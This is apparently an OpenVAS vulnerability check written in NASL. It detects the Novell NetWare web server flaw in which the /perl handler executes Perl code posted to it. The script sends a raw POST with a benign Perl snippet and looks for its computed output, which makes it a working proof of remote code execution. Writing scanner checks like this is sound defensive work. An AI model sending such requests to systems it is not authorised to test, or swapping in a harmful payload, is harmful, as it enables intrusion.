# OpenVAS Vulnerability Test
# $Id: netware_post_perl.nasl 9348 2018-04-06 07:01:19Z cfischer $
# Description: Novell NetWare HTTP POST Perl Code Execution Vulnerability
#
# Authors:
# visigoth <visigoth@securitycentric.com>
#
# Copyright:
# Copyright (C) 2002 visigoth
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "Novell Netware contains multiple default web server installations.  
The Netware Enterprise Web Server (Netscape/IPlanet) has a perl 
handler which will run arbitrary code given to in a POST request 
version 5.x (through SP4) and 6.x (through SP1) are effected.";

tag_solution = "Install 5.x SP5 or 6.0 SP2

Additionally, the enterprise manager web interface may be used to
unmap the /perl handler entirely.  If it is not being used, minimizing
this service would be appropriate.";


#
# REGISTER
#
if(description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.11158");
 script_version("$Revision: 9348 $");
 script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:01:19 +0200 (Fri, 06 Apr 2018) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_bugtraq_id(5520, 5521, 5522);
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_cve_id("CVE-2002-1436", "CVE-2002-1437", "CVE-2002-1438"); 
 
 name = "Novell NetWare HTTP POST Perl Code Execution Vulnerability";
 script_name(name);
 

 
 script_category(ACT_GATHER_INFO);
  script_tag(name:"qod_type", value:"remote_vul");
 
 script_copyright("This script is Copyright (C) 2002 visigoth");

 family = "Netware";
 script_family(family);

 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80, 2200);
 script_exclude_keys("Settings/disable_cgi_scanning");

 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

http_POST = string("POST /perl/ HTTP/1.1\r\n",
	 	   "Content-Type: application/octet-stream\r\n",
		   "Host: ", get_host_name(), "\r\n",
		   "Content-Length: ");

perl_code = 'print("Content-Type: text/plain\\r\\n\\r\\n", "OpenVAS=", 42+42);';

length = strlen(perl_code);
data = string(http_POST, length ,"\r\n\r\n",  perl_code);
rcv = http_keepalive_send_recv(port:port, data:data);
if(!rcv) exit(0);

if("OpenVAS=84" >< rcv)
{
	security_message(port);
}
